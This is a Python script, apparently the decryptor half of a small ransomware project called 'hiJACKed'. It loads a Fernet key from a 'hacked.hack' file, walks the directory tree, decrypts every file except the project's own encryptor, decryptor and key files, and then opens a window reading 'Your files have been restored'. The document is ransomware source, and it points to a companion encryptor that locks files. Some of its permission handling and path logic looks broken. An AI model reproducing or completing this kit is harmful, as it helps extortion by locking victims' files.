# Imports the OS module used for performing operating system functions like getting the current working directory.
import os
import os.path

# Imports the OS module used for finding the operating system platform.
import platform

# Imports the module to change file attributes.
import stat

# Imports the Fernet cryptography module that we will be using to encrypt files.
from cryptography.fernet import Fernet

# Imports the tkinter modules that we will be using to display a new window.
from tkinter import *
from tkinter.ttk import *

# Creates a variable and assigns it to the Operating system platform, then prints to the console.
operating_system = platform.system()
print(operating_system)

# If the platform it is running on is Windows, it will print CWD (Current Working Directory) as the Users folder on the C drive.
if operating_system == "Windows":
	print("CWD = C:\\Users\\")

	# A variable is created and assigned to a string "\\""
	operator = "\\"
	#cwd = "C:\\Users\\"

# Creates a variable and assigns it to the current working directory .
cwd = os.getcwd()

# Changes the current working directory to write instead of read-only.
os.chmod(cwd, stat.S_IRWXO)
os.chmod(cwd, stat.S_IRWXG)

# Creates an empty array.
files = []

# Opens the .hack file that contains the key in binary mode.
with open("hacked.hack", "rb") as key:

	# Creates a variable and assigns it to the binary value of the .hack file.
	secretkey = key.read()

# Defines a function called decrypt, expecting the current working directory argument.
def decrypt(cwd):

	# Changes the current working directory to write instead of read-only.
	os.chmod(cwd, 777)

	# Changes the first file in the list to write instead of read-only.
	os.chmod(files[0], stat.S_IRWXG)

	# Opens the first file in the list in read-binary mode.
	with open(files[0], "rb") as thefile:

		# Assigns the binary value inside of the file to the variable "contents".
		contents = thefile.read()

	# Creates a variable and assigns it to the decrypted value of the contents variable using the key.
	contents_decrypted = Fernet(secretkey).decrypt(contents)

	# Changes the first file in the list to write instead of read-only.
	os.chmod(files[0], stat. S_IWRITE)

	# Opens the first file in the list in write-binary mode.
	with open(files[0], "wb") as thefile:

		# Writes the decrypted value to the file.
		thefile.write(contents_decrypted)

	# Removes the first file from the list.
	files.pop(0)

# Defines a new function, expecting an argument called newwd (new working directory).
def folder(newwd):
	
	# Assigns the current working directory to the new working directory argument.
	cwd = newwd	

	# Changes directory to write mode instead of read-only.
	os.chmod(cwd, stat.S_IRWXG)

	# Creates a count controlled loop that goes through each object in the directory.
	for file in os.listdir(newwd):

		# Changes file to write mode instead of read-only.
		os.chmod(file, stat.S_IRWXG)

		# Checks to see if the file is any of the required files for the software to work, and if TRUE it skips.
		if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
			continue
		
		# Changes file to write mode instead of read-only.
		os.chmod(file, stat.S_IRWXG)

		# Checks to see if the object is a file.
		if os.path.isfile(cwd+file):

			# If TRUE it adds the file to the files list.
			files.append(cwd+file)

			# Calls the decrypt function to decrypt the file that was just added to the list.
			decrypt(cwd)

		# Changes file to write mode instead of read-only.
		os.chmod(file, stat.S_IRWXG)

		# Checks to see if the object is a directory.
		if os.path.isdir(cwd+file):

			# If TRUE it sets the new working directory to the object
			newwd = ((cwd)+file+operator)

			# Calls the folder function to go through the newest folder.
			folder(newwd)

# Assigns the current working directory variable to the directory where the script is running and appends the operator to the end.
cwd = os.getcwd()+operator

# Goes through each object in the current working directory.
for file in os.listdir(cwd):

	# Checks to see if object is any of the required files for the software to work, and if TRUE it skips.
	if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
		continue

	# Checks to see if the object is a file
	if os.path.isfile(file):

		# If TRUE it adds the file to the files list.
		files.append(cwd+file)

		# Calls the decrypt function with the current working directory as the argument.
		decrypt(cwd)
	
	# Checks to see if the object is a directory.
	if os.path.isdir(file):

		# If TRUE it sets the new working directory to the directory inside of the object.
		newwd = (os.getcwd()+operator+file+operator)

		# Calls the folder function with the new working directory argument.
		folder(newwd)

# Creates a variable and uses it to open a TK Window.
master = Tk()

# Sets the resolution of the TK Window.
master.geometry("500x500")

# Sets the value of the text within the TK Window.
label = Label(master,
		text ="\n""\n""\n""\n""Your files have been restored""\n""\n""\n""\n")

# Adds some padding to the window on the Y-axis.
label.pack(pady = 5)

# Adds a title to the TK Window.
master.title("hiJACKed")

# Function within the TK module that forces the window to run infinitely until it is force closed.
mainloop()